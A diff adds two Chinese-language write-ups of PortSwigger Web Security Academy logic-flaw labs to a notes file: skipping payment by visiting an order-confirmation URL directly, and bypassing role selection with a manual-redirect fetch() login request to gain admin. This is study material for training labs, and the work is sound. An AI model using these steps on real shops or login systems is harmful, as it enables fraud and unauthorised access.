@@ -164,6 +164,44 @@ fetch(
 );
 ```
 
+## Lab: Insufficient workflow validation
+
+| Dimension | Description                                                                                                |
+| --------- | ---------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input        |
+| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation |
+
+先買一個 $100 以內的商品，觀察結帳流程，這題在結帳成功後，會 303 轉到 https://0a0c008b03f8bc97802e08ae001800fe.web-security-academy.net/cart/order-confirmation?order-confirmed=true
+
+之後再把 $1337 的商品加入購物車，然後直接訪問上面的網址，就成功通關了～
+
+## Lab: Authentication bypass via flawed state machine
+
+| Dimension | Description                                                                                                              |
+| --------- | ------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input                      |
+| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine |
+
+這題登入後會 302 到 `/role-selector`，並且 GET 訪問該頁，會再回傳 `Set-Cookie: session=XaoJcQhdiqv6zs0QbxFM4DtZWifdops5; Secure; HttpOnly; SameSite=None`，但其實登入的時候就已經會 Set-Cookie 了，所以我們嘗試登入後不訪問 `/role-selector`
+
+```js
+fetch(
+  "https://0abb00e503f8f3658105527d001400a9.web-security-academy.net/login",
+  {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
+    },
+    body: "csrf=4b6K80egvr3eWHeNzSpbUFUrYcqInOkH&username=wiener&password=peter",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+    redirect: "manual",
+  },
+);
+```
+
+成功拿到 Admin panel 權限～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/host-header
